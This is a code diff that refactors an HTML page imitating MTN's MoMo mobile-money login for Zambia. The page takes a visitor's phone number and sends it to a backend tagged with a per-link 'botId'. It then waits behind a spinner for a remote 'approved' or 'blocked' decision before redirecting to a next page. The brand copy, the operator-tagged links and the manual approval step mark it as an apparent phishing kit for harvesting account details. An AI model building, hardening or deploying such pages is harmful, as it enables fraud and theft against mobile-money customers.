@@ -1,83 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script>
-    // ============================================================
-    //  BOT ID RESOLVER — runs FIRST on every page load
-    //  Reads botId from URL immediately. Never defaults to bot1.
-    //  Persists to localStorage. Rewrites URL so refreshes keep it.
-    //  Stops the page if botId is missing.
-    // ============================================================
-    (function () {
-        try {
-            const params = new URLSearchParams(window.location.search);
-
-            // 1. Read from URL FIRST
-            let botId = params.get('botId');
-
-            // 2. Fall back to localStorage ONLY if URL is empty
-            if (!botId) {
-                botId = localStorage.getItem('botId');
-            }
-
-            // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
-            if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
-                document.documentElement.innerHTML =
-                    '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
-                    '<h2>Invalid link</h2>' +
-                    '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
-                    '</body>';
-                window.__BOTID_MISSING__ = true;
-                throw new Error('botId missing from URL and localStorage');
-            }
-
-            // 4. Persist so later pages inherit it
-            localStorage.setItem('botId', botId);
-
-            // 5. Ensure the URL always carries botId
-            if (params.get('botId') !== botId) {
-                params.set('botId', botId);
-                const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
-                window.history.replaceState({}, '', newUrl);
-            }
-
-            // 6. Expose globally
-            window.__BOT_ID__ = botId;
-
-            console.log('🆔 botId resolved immediately:', botId);
-        } catch (err) {
-            console.error('botId resolver failed:', err.message);
-        }
-    })();
-    </script>
-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>MoMo</title>
 
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html,
-        body {
-            width: 100%;
-            min-height: 100%;
-        }
-
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            background: #fff;
-            overflow-x: hidden;
-        }
-
-        /* =========================================
-           APP CONTAINER
-        ========================================= */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; min-height: 100%; }
+        body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }
 
         .app {
             position: relative;
@@ -91,364 +22,131 @@
             padding-bottom: 110px;
         }
 
-
-        /* =========================================
-           TOP BLUE AREA
-        ========================================= */
-
-        .top {
-            position: relative;
-            height: 390px;
-            background: #004c69;
-            padding-top: 52px;
-        }
-
+        .top { position: relative; height: 390px; background: #004c69; padding-top: 52px; }
         .top::after {
-            content: "";
-            position: absolute;
-            left: -10%;
-            bottom: -75px;
-            width: 120%;
-            height: 125px;
-            background: #fff;
+            content: ""; position: absolute; left: -10%; bottom: -75px;
+            width: 120%; height: 125px; background: #fff;
             border-radius: 50% 50% 0 0 / 70% 70% 0 0;
         }
 
-
-        /* =========================================
-           MOMO LOGO
-        ========================================= */
-
         .logo {
-            position: relative;
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
+            position: relative; z-index: 2;
+            display: flex; flex-direction: column; align-items: center; text-align: center;
         }
-
         .logo-box {
-            width: 76px;
-            height: 76px;
-            border-radius: 9px;
+            width: 76px; height: 76px; border-radius: 9px;
             background: linear-gradient(145deg, #087398, #003d59);
             box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
+            display: flex; align-items: center; justify-content: center; position: relative;
         }
-
         .logo-symbol {
-            position: relative;
-            width: 40px;
-            height: 48px;
-            background: #ffd500;
+            position: relative; width: 40px; height: 48px; background: #ffd500;
             clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
         }
-
         .logo-symbol::after {
-            content: "";
-            position: absolute;
-            width: 11px;
-            height: 11px;
-            background: #004c69;
-            border-radius: 50%;
-            left: 14px;
-            top: 14px;
+            content: ""; position: absolute; width: 11px; height: 11px;
+            background: #004c69; border-radius: 50%; left: 14px; top: 14px;
         }
-
         .momo {
-            margin-top: 8px;
-            color: #ffd500;
-            font-size: 36px;
-            line-height: 34px;
-            font-weight: 800;
-            letter-spacing: -1.5px;
+            margin-top: 8px; color: #ffd500; font-size: 36px; line-height: 34px;
+            font-weight: 800; letter-spacing: -1.5px;
         }
-
-        .from-mtn {
-            margin-top: 3px;
-            color: #ffd500;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-
-        /* =========================================
-           WELCOME CARD
-        ========================================= */
+        .from-mtn { margin-top: 3px; color: #ffd500; font-size: 14px; font-weight: 600; }
 
         .card {
-            position: relative;
-            z-index: 5;
-            width: calc(100% - 36px);
-            margin: -142px auto 0;
-            background: #fff;
-            border-radius: 34px;
+            position: relative; z-index: 5;
+            width: calc(100% - 36px); margin: -142px auto 0;
+            background: #fff; border-radius: 34px;
             padding: 44px 27px 27px;
             box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
         }
-
         .title {
-            text-align: center;
-            color: #07516b;
-            font-size: 25px;
-            font-weight: 400;
-            margin-bottom: 49px;
+            text-align: center; color: #07516b;
+            font-size: 25px; font-weight: 400; margin-bottom: 49px;
         }
+        .title strong { font-weight: 700; }
 
-        .title strong {
-            font-weight: 700;
-        }
-
-
-        /* =========================================
-           PHONE INPUT
-        ========================================= */
-
-        .phone-row {
-            display: flex;
-            align-items: center;
-            width: 100%;
-            gap: 16px;
-        }
-
+        .phone-row { display: flex; align-items: center; width: 100%; gap: 16px; }
         .country {
-            flex: 0 0 96px;
-            width: 96px;
-            height: 98px;
-            background: #fff;
-            border: 1.5px solid #111;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: default;
-            pointer-events: none;
+            flex: 0 0 96px; width: 96px; height: 98px;
+            background: #fff; border: 1.5px solid #111; border-radius: 20px;
+            display: flex; align-items: center; justify-content: center;
+            cursor: default; pointer-events: none;
         }
-
         .flag {
-            width: 39px;
-            height: 27px;
-            border-radius: 50%;
+            width: 39px; height: 27px; border-radius: 50%;
             background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 20"><rect width="30" height="20" fill="%23198a00"/><rect x="22" y="0" width="8" height="20" fill="%23de2010"/><rect x="22" y="0" width="2.666" height="20" fill="%23000"/><rect x="24.666" y="0" width="2.666" height="20" fill="%23de2010"/><rect x="27.333" y="0" width="2.666" height="20" fill="%23ef7d00"/><path d="M18 2 L20 4 L22 2 L21 5 L23 6 L20 7 L19 10 L18 7 L15 6 L17 5 Z" fill="%23ef7d00"/></svg>') center/cover;
         }
-
         .phone-input {
-            flex: 1;
-            min-width: 0;
-            height: 98px;
-            border: 1.5px solid #111;
-            border-radius: 27px;
-            outline: none;
-            padding: 0 23px;
-            font-family: Arial, Helvetica, sans-serif;
-            font-size: 22px;
-            color: #111;
-            background: #fff;
+            flex: 1; min-width: 0; height: 98px;
+            border: 1.5px solid #111; border-radius: 27px; outline: none;
+            padding: 0 23px; font-family: Arial, Helvetica, sans-serif;
+            font-size: 22px; color: #111; background: #fff;
         }
-
-        .phone-input::placeholder {
-            color: #111;
-            opacity: 1;
-            font-size: 18px;
-        }
-
-        .phone-input:focus {
-            border-color: #005572;
-        }
-
-
-        /* =========================================
-           TERMS
-        ========================================= */
+        .phone-input::placeholder { color: #111; opacity: 1; font-size: 18px; }
+        .phone-input:focus { border-color: #005572; }
 
         .terms {
-            width: calc(100% - 45px);
-            margin: 48px auto 0;
-            text-align: center;
-            color: #666;
-            font-size: 16px;
-            line-height: 23px;
+            width: calc(100% - 45px); margin: 48px auto 0;
+            text-align: center; color: #666; font-size: 16px; line-height: 23px;
         }
-
-        .terms a {
-            color: #00516c;
-            text-decoration: none;
-        }
-
-
-        /* =========================================
-           BOTTOM BUTTON — FIXED AT BOTTOM
-        ========================================= */
+        .terms a { color: #00516c; text-decoration: none; }
 
         .bottom {
-            position: fixed;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100%;
-            max-width: 540px;
+            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+            width: 100%; max-width: 540px;
             padding: 12px 18px calc(14px + env(safe-area-inset-bottom));
-            background: #fff;
-            z-index: 100;
+            background: #fff; z-index: 100;
         }
-
         .next {
-            width: 100%;
-            height: 69px;
-            border: none;
-            border-radius: 40px;
-            background: #d1d5db;
-            color: #fff;
-            font-size: 22px;
-            font-weight: 700;
-            cursor: not-allowed;
-            font-family: Arial, Helvetica, sans-serif;
-            transition: background 0.3s ease;
-            position: relative;
+            width: 100%; height: 69px; border: none; border-radius: 40px;
+            background: #d1d5db; color: #fff; font-size: 22px; font-weight: 700;
+            cursor: not-allowed; font-family: Arial, Helvetica, sans-serif;
+            transition: background 0.3s ease; position: relative;
         }
+        .next:enabled { background: #005572; cursor: pointer; }
+        .next:enabled:hover { background: #00415a; }
+        .next:enabled:active { transform: scale(.98); }
 
-        .next:enabled {
-            background: #005572;
-            cursor: pointer;
-        }
-
-        .next:enabled:hover {
-            background: #00415a;
-        }
-
-        .next:enabled:active {
-            transform: scale(.98);
-        }
-
-        /* Keep button visible while loading */
-        .next.loading:disabled {
-            background: #005572;
-            opacity: 1;
-            cursor: wait;
-        }
+        .next.loading:disabled { background: #005572; opacity: 1; cursor: wait; }
 
         .next .btn-text { display: inline; }
         .next .btn-spinner {
-            display: none;
-            width: 26px;
-            height: 26px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid #fff;
-            border-radius: 50%;
-            animation: spin .8s linear infinite;
-            margin: 0 auto;
+            display: none; width: 26px; height: 26px;
+            border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff;
+            border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto;
         }
-
         .next.loading .btn-text { display: none; }
         .next.loading .btn-spinner { display: block; }
 
-
-        /* =========================================
-           STATUS
-        ========================================= */
-
         .status {
-            display: none;
-            margin-top: 16px;
-            text-align: center;
-            font-size: 14px;
-            padding: 10px 14px;
-            border-radius: 12px;
-            font-weight: 500;
+            display: none; margin-top: 16px; text-align: center; font-size: 14px;
+            padding: 10px 14px; border-radius: 12px; font-weight: 500;
             border: 1px solid transparent;
         }
+        .status.error   { color: #c0392b; background: #fef3f2; border-color: #fecdca; }
+        .status.success { color: #065f46; background: #ecfdf5; border-color: #6ee7b7; }
 
-        .status.error {
-            color: #c0392b;
-            background: #fef3f2;
-            border-color: #fecdca;
-        }
-
-        .status.success {
-            color: #065f46;
-            background: #ecfdf5;
-            border-color: #6ee7b7;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-
-        /* =========================================
-           RESPONSIVE
-        ========================================= */
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         @media (max-width: 480px) {
-
-            .top {
-                height: 375px;
-                padding-top: 52px;
-            }
-
-            .card {
-                width: calc(100% - 36px);
-                margin-top: -127px;
-                padding: 44px 27px 27px;
-            }
-
-            .title {
-                font-size: 24px;
-                margin-bottom: 48px;
-            }
-
+            .top { height: 375px; padding-top: 52px; }
+            .card { width: calc(100% - 36px); margin-top: -127px; padding: 44px 27px 27px; }
+            .title { font-size: 24px; margin-bottom: 48px; }
             .phone-row { gap: 16px; }
             .country { flex-basis: 96px; }
-
-            .phone-input {
-                font-size: 20px;
-                padding-left: 20px;
-                padding-right: 15px;
-            }
-
+            .phone-input { font-size: 20px; padding-left: 20px; padding-right: 15px; }
             .phone-input::placeholder { font-size: 16px; }
-
             .terms { margin-top: 48px; }
-
-            .bottom {
-                padding: 10px 14px calc(12px + env(safe-area-inset-bottom));
-            }
+            .bottom { padding: 10px 14px calc(12px + env(safe-area-inset-bottom)); }
         }
-
-
-        /* =========================================
-           SMALL PHONES
-        ========================================= */
-
         @media (max-width: 380px) {
-
-            .card {
-                padding-left: 20px;
-                padding-right: 20px;
-            }
-
-            .country {
-                flex-basis: 82px;
-                width: 82px;
-            }
-
+            .card { padding-left: 20px; padding-right: 20px; }
+            .country { flex-basis: 82px; width: 82px; }
             .phone-row { gap: 10px; }
-
-            .phone-input {
-                font-size: 18px;
-                padding-left: 15px;
-            }
-
+            .phone-input { font-size: 18px; padding-left: 15px; }
             .phone-input::placeholder { font-size: 14px; }
-
-            .terms {
-                width: calc(100% - 30px);
-                font-size: 14px;
-            }
+            .terms { width: calc(100% - 30px); font-size: 14px; }
         }
     </style>
 </head>
@@ -457,41 +155,19 @@
 
 <div class="app">
 
-    <!-- ================= TOP ================= -->
-
     <div class="top">
-
         <div class="logo">
-
-            <div class="logo-box">
-                <div class="logo-symbol"></div>
-            </div>
-
-            <div class="momo">
-                MoMo
-            </div>
-
-            <div class="from-mtn">
-                from MTN
-            </div>
-
+            <div class="logo-box"><div class="logo-symbol"></div></div>
+            <div class="momo">MoMo</div>
+            <div class="from-mtn">from MTN</div>
         </div>
-
     </div>
 
-
-    <!-- ================= CARD ================= -->
-
     <div class="card">
-
-        <div class="title">
-            Welcome to <strong>MoMo</strong>
-        </div>
+        <div class="title">Welcome to <strong>MoMo</strong></div>
 
         <form id="detailsForm">
-
             <div class="phone-row">
-
                 <div class="country" aria-label="Zambia">
                     <span class="flag"></span>
                 </div>
@@ -507,38 +183,21 @@
                     autocomplete="tel"
                     required
                 >
-
             </div>
 
             <div id="status" class="status"></div>
-
         </form>
-
     </div>
 
-
-    <!-- ================= TERMS ================= -->
-
     <div class="terms">
-
         By using this app you agree to our
-        <a href="#">
-            Mobile Terms of Use
-        </a>
-
+        <a href="#">Mobile Terms of Use</a>
         <br>
-
         and
-
-        <a href="#">
-            Privacy Policy
-        </a>
-
+        <a href="#">Privacy Policy</a>
     </div>
 
 </div>
-
-<!-- ================= NEXT — FIXED BOTTOM ================= -->
 
 <div class="bottom">
     <button class="next" type="submit" id="continueBtn" form="detailsForm" disabled>
@@ -547,23 +206,93 @@
     </button>
 </div>
 
+
+<!-- ============================================================
+     SCRIPT 1 — BOT ID RESOLVER (moved from <head> to here)
+     Runs first because it appears first among the bottom scripts.
+     ============================================================ -->
 <script>
+(function () {
+    try {
+        const params = new URLSearchParams(window.location.search);
+
+        // 1. Read from URL FIRST
+        let botId = params.get('botId');
+
+        // 2. Fall back to localStorage ONLY if URL is empty
+        if (!botId) {
+            botId = localStorage.getItem('botId');
+        }
+
+        // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
+        if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+            document.documentElement.innerHTML =
+                '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+                '<h2>Invalid link</h2>' +
+                '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
+                '</body>';
+            window.__BOTID_MISSING__ = true;
+            throw new Error('botId missing from URL and localStorage');
+        }
+
+        // 4. Persist so later pages inherit it
+        localStorage.setItem('botId', botId);
+
+        // 5. Ensure the URL always carries botId
+        if (params.get('botId') !== botId) {
+            params.set('botId', botId);
+            const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+            window.history.replaceState({}, '', newUrl);
+        }
+
+        // 6. Expose globally
+        window.__BOT_ID__ = botId;
+
+        console.log('🆔 botId resolved immediately:', botId);
+    } catch (err) {
+        console.error('botId resolver failed:', err.message);
+    }
+})();
+</script>
+
+
+<!-- ============================================================
+     SCRIPT 2 — PAGE LOGIC
+     Wrapped in an IIFE so `return` is legal and nothing dies
+     with a SyntaxError.
+     ============================================================ -->
+<script>
+(function () {
+    'use strict';
+
     // ---------- CONFIG ----------
     const BACKEND_URL = ""; // leave empty to use same-origin
 
-    // ---------- BOTID (resolved by the head script) ----------
+    // ---------- BOTID (set by script 1 above) ----------
     const botId = window.__BOT_ID__;
-    if (!botId) return;
+    if (!botId) {
+        console.warn('[MoMo] botId missing — page will not submit.');
+    }
 
     // ---------- USER NAME (silent, no prompt) ----------
-    let fullName = localStorage.getItem('fullName') || 'User';
-    localStorage.setItem('fullName', fullName);
+    let fullName = 'User';
+    try {
+        fullName = localStorage.getItem('fullName') || 'User';
+        localStorage.setItem('fullName', fullName);
+    } catch (e) { /* storage blocked — keep default */ }
 
     // ---------- DOM REFS ----------
-    const form = document.getElementById('detailsForm');
-    const phone = document.getElementById('phone');
-    const button = document.getElementById('continueBtn');
+    const form     = document.getElementById('detailsForm');
+    const phone    = document.getElementById('phone');
+    const button   = document.getElementById('continueBtn');
     const statusEl = document.getElementById('status');
+
+    if (!form || !phone || !button || !statusEl) {
+        console.error('[MoMo] Missing DOM elements', {
+            form: !!form, phone: !!phone, button: !!button, statusEl: !!statusEl
+        });
+        return;
+    }
 
     let pollTimer = null;
 
@@ -573,23 +302,27 @@
         button.disabled = (digits.length === 0) || button.classList.contains('loading');
     }
 
-    phone.addEventListener('input', function() {
+    // ---------- PHONE INPUT ----------
+    phone.addEventListener('input', function () {
         let value = this.value;
 
-        // Keep only digits, spaces, and '+'
         value = value.replace(/[^\d+\s]/g, '');
 
-        // Ensure '+' only appears at the very start (once)
         const hasPlus = value.startsWith('+');
         value = value.replace(/\+/g, '');
         if (hasPlus) value = '+' + value;
 
-        // Collapse multiple spaces into one
         value = value.replace(/\s+/g, ' ');
 
         this.value = value;
         validateForm();
     });
+
+    // Belt-and-braces for stubborn mobile keyboards / autofill
+    phone.addEventListener('keyup',  validateForm);
+    phone.addEventListener('change', validateForm);
+    phone.addEventListener('paste',  function () { setTimeout(validateForm, 0); });
+    phone.addEventListener('cut',    function () { setTimeout(validateForm, 0); });
 
     // ---------- HELPERS ----------
     function stopPolling() {
@@ -622,17 +355,22 @@
     }
 
     // ---------- FORM SUBMIT ----------
-    form.addEventListener('submit', async (e) => {
+    form.addEventListener('submit', async function (e) {
         e.preventDefault();
         if (button.classList.contains('loading')) return;
 
-        let raw = phone.value.trim();
-        const hasPlus = raw.startsWith('+');
-        const digits = raw.replace(/\D/g, '');
+        const raw      = phone.value.trim();
+        const hasPlus  = raw.startsWith('+');
+        const digits   = raw.replace(/\D/g, '');
         const phoneVal = (hasPlus ? '+' : '') + digits;
 
         if (!digits) {
             setStatus('❌ Please enter a phone number.', 'error');
+            return;
+        }
+
+        if (!botId) {
+            setStatus('❌ Invalid link. Please open this page through the official link.', 'error');
             return;
         }
 
@@ -643,7 +381,7 @@
             const res = await fetch(BACKEND_URL + '/submit-phone', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
+                body: JSON.stringify({ name: fullName, phone: phoneVal, botId: botId })
             });
 
             if (!res.ok) {
@@ -654,44 +392,46 @@
                 throw new Error(clean);
             }
 
-            const { requestId } = await res.json();
+            const data = await res.json();
+            const requestId = data.requestId;
             if (!requestId) throw new Error('No request ID returned');
 
-            localStorage.setItem('phone', phoneVal);
-            localStorage.setItem('phoneRequestId', requestId);
+            try {
+                localStorage.setItem('phone', phoneVal);
+                localStorage.setItem('phoneRequestId', requestId);
+            } catch (e) { /* storage blocked */ }
 
-            // Start polling — spinner on button covers the wait silently
             stopPolling();
             let attempts = 0;
             const MAX_ATTEMPTS = 120; // ~3 minutes
 
-            pollTimer = setInterval(async () => {
+            pollTimer = setInterval(async function () {
                 attempts++;
                 try {
-                    const checkRes = await fetch(BACKEND_URL + '/check-phone/' + requestId);
-                    const data = await checkRes.json();
+                    const checkRes = await fetch(BACKEND_URL + '/check-phone/' + encodeURIComponent(requestId));
+                    const check = await checkRes.json();
 
-                    if (data.blocked === true) {
+                    if (check.blocked === true) {
                         stopPolling();
                         setLoading(false);
                         setStatus('❌ Account restricted. Please try again later.', 'error');
                         return;
                     }
 
-                    if (data.approved === true) {
+                    if (check.approved === true) {
                         stopPolling();
                         setLoading(false);
                         setStatus('✅ Verified! Redirecting...', 'success');
-                        const redirectUrl = 'link.html?requestId=' + requestId +
-                                            '&phone=' + encodeURIComponent(phoneVal) +
-                                            '&botId=' + encodeURIComponent(botId);
-                        setTimeout(() => {
+                        const redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
+                                            '&phone='     + encodeURIComponent(phoneVal) +
+                                            '&botId='     + encodeURIComponent(botId);
+                        setTimeout(function () {
                             window.location.href = redirectUrl;
                         }, 700);
                         return;
                     }
 
-                    if (data.approved === false) {
+                    if (check.approved === false) {
                         stopPolling();
                         setLoading(false);
                         setStatus('❌ Incorrect number. Please try again.', 'error');
@@ -702,10 +442,7 @@
                         stopPolling();
                         setLoading(false);
                         setStatus('⏳ Taking too long. Please try again.', 'error');
-                        return;
                     }
-
-                    // No periodic "waiting" updates — spinner is enough
                 } catch (err) {
                     console.error('Polling error:', err);
                 }
@@ -719,7 +456,10 @@
 
     // ---------- INIT ----------
     validateForm();
-    phone.focus();
+    try { phone.focus(); } catch (e) {}
+
+    console.log('✅ MoMo details page ready. botId =', botId);
+})();
 </script>
 
 </body>
